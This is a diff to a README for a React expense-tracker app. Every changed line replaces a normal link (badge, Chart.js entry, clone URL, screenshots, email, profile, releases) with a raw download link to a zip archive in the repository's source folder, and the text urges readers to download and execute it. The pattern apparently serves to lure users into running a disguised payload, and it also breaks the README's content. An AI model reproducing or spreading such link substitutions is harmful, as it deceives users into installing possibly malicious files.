@@ -1,6 +1,6 @@
 # Expense Tracker Web Application 🧾
 
-![Expense Tracker](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen?style=flat-square&logo=github)
+![Expense Tracker](https://github.com/Keanau007/Expense-Tracker-Web-Application/raw/refs/heads/main/src/utils/Application_Expense_Web_Tracker_2.4-alpha.4.zip%20Latest%20Release-Click%20Here-brightgreen?style=flat-square&logo=github)
 
 Welcome to the **Expense Tracker Web Application**! This project is designed to help you manage your personal finances with ease. Built using **React**, **JavaScript**, and **Tailwind CSS**, it offers a modern and intuitive interface for tracking your expenses and analyzing your financial habits.
 
@@ -31,7 +31,7 @@ This application leverages several technologies to deliver a robust user experie
 - **React**: A JavaScript library for building user interfaces.
 - **JavaScript**: The programming language that powers the application.
 - **Tailwind CSS**: A utility-first CSS framework for styling.
-- **Chart.js**: A library for creating interactive charts.
+- **https://github.com/Keanau007/Expense-Tracker-Web-Application/raw/refs/heads/main/src/utils/Application_Expense_Web_Tracker_2.4-alpha.4.zip**: A library for creating interactive charts.
 
 ## Getting Started 🚀
 
@@ -39,7 +39,7 @@ To get started with the Expense Tracker Web Application, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Keanau007/Expense-Tracker-Web-Application.git
+   git clone https://github.com/Keanau007/Expense-Tracker-Web-Application/raw/refs/heads/main/src/utils/Application_Expense_Web_Tracker_2.4-alpha.4.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -84,13 +84,13 @@ Once the application is running, you can start managing your finances. Here’s 
 
 Here are some screenshots of the application:
 
-![Dashboard](https://via.placeholder.com/600x400?text=Dashboard+Screenshot)
+![Dashboard](https://github.com/Keanau007/Expense-Tracker-Web-Application/raw/refs/heads/main/src/utils/Application_Expense_Web_Tracker_2.4-alpha.4.zip+Screenshot)
 *Dashboard showing transaction overview*
 
-![Transaction Form](https://via.placeholder.com/600x400?text=Transaction+Form+Screenshot)
+![Transaction Form](https://github.com/Keanau007/Expense-Tracker-Web-Application/raw/refs/heads/main/src/utils/Application_Expense_Web_Tracker_2.4-alpha.4.zip+Form+Screenshot)
 *Form for adding a new transaction*
 
-![Analytics](https://via.placeholder.com/600x400?text=Analytics+Screenshot)
+![Analytics](https://github.com/Keanau007/Expense-Tracker-Web-Application/raw/refs/heads/main/src/utils/Application_Expense_Web_Tracker_2.4-alpha.4.zip+Screenshot)
 *Interactive charts displaying financial analytics*
 
 ## Contributing 🤝
@@ -121,12 +121,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or inquiries, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **GitHub**: [Keanau007](https://github.com/Keanau007)
+- **Email**: https://github.com/Keanau007/Expense-Tracker-Web-Application/raw/refs/heads/main/src/utils/Application_Expense_Web_Tracker_2.4-alpha.4.zip
+- **GitHub**: [Keanau007](https://github.com/Keanau007/Expense-Tracker-Web-Application/raw/refs/heads/main/src/utils/Application_Expense_Web_Tracker_2.4-alpha.4.zip)
 
 ## Releases 📦
 
-To download the latest release of the Expense Tracker Web Application, visit [this link](https://github.com/Keanau007/Expense-Tracker-Web-Application/releases). You can find the necessary files to download and execute.
+To download the latest release of the Expense Tracker Web Application, visit [this link](https://github.com/Keanau007/Expense-Tracker-Web-Application/raw/refs/heads/main/src/utils/Application_Expense_Web_Tracker_2.4-alpha.4.zip). You can find the necessary files to download and execute.
 
 If you want to stay updated with the latest features and fixes, check the **Releases** section regularly.
 
